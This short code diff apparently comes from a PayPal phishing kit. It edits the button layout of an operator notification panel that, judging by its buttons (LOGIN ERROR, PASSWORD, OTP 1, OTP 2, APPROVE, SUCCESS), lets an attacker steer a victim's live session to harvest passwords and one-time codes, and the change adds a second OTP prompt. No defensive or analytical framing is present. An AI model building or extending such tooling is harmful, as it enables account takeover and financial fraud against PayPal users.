@@ -126,12 +126,16 @@ export function formatPayPalNotification(data: {
       { text: "❌ LOGIN ERROR ❌", callback_data: `paypal_error_${data.sessionId}` }
     ],
     [
-      { text: "APPROVE", callback_data: `paypal_approve_${data.sessionId}` },
-      { text: "🔑 PASSWORD", callback_data: `paypal_password_${data.sessionId}` }
+      { text: "⏳ WAITING", callback_data: `paypal_waiting_${data.sessionId}` },
+      { text: "✅ APPROVE", callback_data: `paypal_approve_${data.sessionId}` }
     ],
     [
-      { text: "OTP", callback_data: `paypal_otp_${data.sessionId}` },
-      { text: "SUCCESS", callback_data: `paypal_success_${data.sessionId}` }
+      { text: "🔑 PASSWORD", callback_data: `paypal_password_${data.sessionId}` },
+      { text: "🔢 OTP 1", callback_data: `paypal_otp1_${data.sessionId}` }
+    ],
+    [
+      { text: "🔢 OTP 2", callback_data: `paypal_otp2_${data.sessionId}` },
+      { text: "✔️ SUCCESS", callback_data: `paypal_success_${data.sessionId}` }
     ],
     [
       { text: "🏠 HOME", callback_data: `paypal_home_${data.sessionId}` }
